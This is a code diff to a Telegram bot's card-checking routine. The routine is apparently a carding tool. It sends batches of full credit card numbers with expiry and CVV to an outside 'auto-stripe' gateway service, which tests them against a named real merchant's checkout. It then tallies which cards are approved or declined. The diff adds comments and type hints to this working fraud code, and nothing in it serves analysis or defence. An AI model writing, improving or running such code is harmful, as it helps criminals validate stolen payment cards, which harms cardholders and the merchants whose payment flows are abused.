@@ -1713,7 +1713,18 @@ async def consume_credit(user_id: int) -> bool:
     return False
 
 # === FORMAT STATUS ===
+import asyncio
+import aiohttp
+import time
+from telethon.tl.types import Message
+from telethon.utils import escape_markdown
+from telethon.tl.types import ParseMode
+
+# The format_status function remains the same as it correctly styles the output.
 def format_status(api_status: str) -> str:
+    """
+    Formats the raw API status string into a stylized string with emojis and bold text.
+    """
     try:
         clean_status = str(api_status).strip().lower()
         if "approved" in clean_status:
@@ -1742,50 +1753,72 @@ def format_status(api_status: str) -> str:
         return "❌ ERROR ❌"
 
 # === CHECK CARDS BACKGROUND ===
-async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
-    approved_count = declined_count = checked_count = error_count = 0
+async def check_cards_background(cards_to_check: list[str], user_id: int, user_first_name: str, processing_msg: Message, start_time: float):
+    """
+    Asynchronously checks a list of credit cards against an API and updates a message
+    with real-time progress and final results, including stylized status.
+    """
+    approved_count = 0
+    declined_count = 0
+    checked_count = 0
+    error_count = 0
     results = []
     total_cards = len(cards_to_check)
+    
+    # Using a semaphore to limit the number of concurrent API requests to 5.
     semaphore = asyncio.Semaphore(5)
 
-    async def check_card(session, raw):
+    async def check_card(session: aiohttp.ClientSession, raw: str) -> str:
+        """
+        Processes a single card asynchronously, handling API calls and formatting the output.
+        """
         nonlocal approved_count, declined_count, checked_count, error_count
 
         async with semaphore:
+            # Safely split and normalize the card data
             parts = raw.strip().split("|")
             if len(parts) != 4:
                 checked_count += 1
                 error_count += 1
                 return f"❌ Invalid card format: `{escape_markdown(raw, version=2)}`"
-
+            
+            # Normalize the year part of the card
             if len(parts[2]) == 4:
                 parts[2] = parts[2][-2:]
             cc_normalized = "|".join(parts)
 
+            # Construct the API URL
             api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
 
             try:
+                # Make the API call with a timeout
                 async with session.get(api_url, timeout=45) as resp:
                     if resp.status != 200:
                         raise Exception(f"HTTP {resp.status}")
                     data = await resp.json()
             except Exception as e:
+                # Handle connection and API errors
                 checked_count += 1
                 error_count += 1
                 return f"❌ API Error for card `{escape_markdown(cc_normalized, version=2)}`: {escape_markdown(str(e), version=2)}"
 
-            # Use API status
+            # Get the raw status from the API response
             api_response = str(data.get("status", "Unknown")).strip()
+            
+            # Use the format_status function to get the stylized text
             status_text = format_status(api_response)
 
-            # Update counts
+            # Update the counts based on the raw API response
             api_response_lower = api_response.lower()
             if "approved" in api_response_lower:
                 approved_count += 1
             elif "declined" in api_response_lower or "incorrect" in api_response_lower:
                 declined_count += 1
 
+            # Increment the total checked count
             checked_count += 1
+            
+            # Return the stylized result string
             return f"`{escape_markdown(cc_normalized, version=2)}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {status_text}"
 
     async with aiohttp.ClientSession() as session:
@@ -1797,6 +1830,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
             result = await coro
             results.append(result)
 
+            # Update the message periodically
             if time.time() - last_update >= update_interval:
                 last_update = time.time()
                 summary_text = (
@@ -1814,8 +1848,10 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                         parse_mode=ParseMode.MARKDOWN_V2
                     )
                 except Exception:
+                    # Fail silently if the message can't be edited
                     pass
 
+    # Final update after all tasks are complete
     final_time_taken = round(time.time() - start_time, 2)
     final_summary = (
         f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
@@ -1826,6 +1862,8 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         f"✘ 𝐓𝗶𝗺𝗲↣{final_time_taken}s\n"
         f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────"
     )
+    
+    # Edit the message with the final summary and all results
     await processing_msg.edit_text(
         final_summary + "\n\n" + "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
         parse_mode=ParseMode.MARKDOWN_V2
